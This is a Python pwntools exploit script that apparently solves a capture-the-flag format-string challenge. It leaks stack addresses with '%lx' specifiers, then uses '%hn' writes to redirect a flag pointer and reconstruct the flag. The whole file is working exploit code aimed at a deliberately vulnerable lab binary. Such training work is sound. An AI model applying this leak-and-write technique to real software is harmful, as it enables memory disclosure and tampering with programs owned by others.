#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 4003 --libc ../../libc.so.6 ../src/printf3
from pwn import *
from pwnlib.term import init

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "../src/printf2.debug")
context.terminal = ["alacritty", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "localhost"
port = int(args.PORT or 14002)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
b *vuln+210
b read_flag
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes


def send_payload(io: process | connect, _payload: bytes, newline: bool = True) -> bytes:
    io.recvuntil(b"$ ")
    io.sendline(b"1")
    io.recvuntil(b"write>")
    io.sendline(_payload)
    io.recvuntil(b"written> ")
    recv = None
    if newline:
        recv = io.recvuntil(b"\n", drop=True)
    else:
        recv = io.recvuntil(b"j@k3", drop=True)
    return recv


def get_stack_var(io: process | connect, index: int) -> bytes:
    return send_payload(io, f"%{index}$lx".encode("ascii"), True)


def read_flag(io: process | connect):
    io.recvuntil(b"$ ")
    io.sendline(b"2")
    return


def exploit() -> bool:
    io = start()

    # leaking all the stack vars
    # for i in range(1, 50):
    #    leak = get_stack_var(io, i)
    #    print(leak)
    #    io.info(f"Leaked the {i}th stack var: {leak.decode('ascii').strip()}.")

    # stack indices
    indices = {"rbp": 22, "flag": 7, "buffer": 8}
    indices["gadget"] = indices["buffer"] + 2  # where the gadget lives
    indices["target"] = indices["gadget"] + 2  # where the flag is to be read
    addrs = {"rbp": 0, "flag": 0, "buffer": 0}

    # calculate addresses
    addrs["rbp"] = int(get_stack_var(io, indices["rbp"]), 16) - 0xB0
    addrs["flag"] = addrs["rbp"] - 0x78
    addrs["buffer"] = addrs["rbp"] - 0x70
    io.success(f"Leaked rbp of main: {hex(addrs['rbp'])}")
    io.success(f"Leaked address of the buffer: {hex(addrs['buffer'])}")
    io.success(f"Leaked address of the flag pointer: {hex(addrs['flag'])}")

    ## do exploit
    addrs["gadget"] = addrs["buffer"] + (8 * (indices["gadget"] - indices["buffer"]))
    addrs["target"] = addrs["buffer"] + (8 * (indices["target"] - indices["buffer"]))
    io.info(
        f"Writing {hex(addrs['target'])} to {hex(addrs['flag'])} @ {hex(addrs['gadget'])}"
    )

    # the address of the gadget
    _t = pack(addrs["target"])
    shorts = [_t[i : i + 2] for i in range(0, len(_t), 2)]
    for i, short in enumerate(shorts, 0):
        # writing the gadget onto the stack
        payload = b"A" * ((indices["gadget"] - indices["buffer"]) * 8)
        payload += pack(addrs["flag"] + (i * 2))
        send_payload(io, payload, False)

        # use that gadget to overwrite the flag ptr
        payload = ""
        if unpack(short, "all") > 0:
            payload = f"%{unpack(short, 'all')}c"
        payload += f"%{indices['gadget']}$hn"
        send_payload(io, payload.encode("ascii"))

    # reading the flag
    read_flag(io)

    # reconstructing the flag
    parts = []
    for i in range(0, 4):
        parts.append(get_stack_var(io, indices["target"] + i)[:16])

    flag = "".join(
        map(lambda x: bytes.fromhex(x.decode("ascii")).decode("utf-8")[::-1], parts)
    )

    with open("./flag.txt", "r") as f_in:
        buf = f_in.readline().strip()
        if buf in flag:
            io.success(f"Flag: {flag}")
            return True
        return False


if __name__ == "__main__":
    exit(exploit())
